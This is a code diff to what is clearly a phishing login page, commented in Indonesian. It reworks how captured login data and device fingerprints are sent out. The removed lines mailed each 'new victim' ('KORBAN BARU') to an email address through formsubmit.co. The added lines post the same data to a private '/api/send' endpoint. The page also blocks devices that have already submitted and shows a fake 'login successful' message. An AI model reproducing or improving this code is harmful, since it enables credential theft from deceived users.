@@ -16,7 +16,7 @@
             document.cookie.indexOf("sudah_submit=1") !== -1;
 
         if(blocked){
-            window.location.replace("blokir.html");
+            window.location.replace("/blokir");
         }
     } catch(e){}
 })();
@@ -328,12 +328,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 <script>
 
 /* =========================================================
-   CONFIG — GANTI EMAIL DI SINI
-   ========================================================= */
-const EMAIL_KAMU = "EMAIL_KAMU@gmail.com";
-
-/* =========================================================
-   DEVICE BLOCK — localStorage + cookie + sessionStorage
+   DEVICE BLOCK
    ========================================================= */
 function setDeviceBlocked(){
     try{
@@ -499,7 +494,7 @@ function detectBrowser(ua){
 
 
 /* =========================================================
-   LOGIN HANDLER
+   LOGIN → NEMBAK KE /api/send
    ========================================================= */
 function closeLogin(){
     document.getElementById("loginModal").classList.remove("show");
@@ -567,29 +562,30 @@ function loginUser(event){
                 waktu: formatWaktuWIB(new Date()),
                 device: detectDevice(ua),
                 os: detectOS(ua),
-                browser: detectBrowser(ua),
-                _subject: "🔥 KORBAN BARU MASUK - " + username,
-                _template: "table",
-                _captcha: "false"
+                browser: detectBrowser(ua)
             };
 
-            return fetch("https://formsubmit.co/ajax/" + EMAIL_KAMU, {
+            return fetch("/api/send", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
         })
-        .then(res => res.json())
+        .then(res => {
+            console.log("STATUS:", res.status);
+            if(res.status === 403){
+                window.location.replace("/blokir");
+                return null;
+            }
+            return res.json();
+        })
         .then(result => {
-            console.log("Terkirim:", result);
+            console.log("RESPON:", result);
             setDeviceBlocked();
             showMessage("✅ Login berhasil!", "success");
         })
         .catch(err => {
-            console.log("Error:", err);
+            console.log("ERROR:", err);
             setDeviceBlocked();
         })
         .finally(() => {
@@ -607,7 +603,7 @@ window.addEventListener("load", function(){
 
     /* KALO DEVICE UDAH SUBMIT → BLOKIR */
     if(cekDeviceBlocked()){
-        window.location.replace("blokir.html");
+        window.location.replace("/blokir");
         return;
     }
 
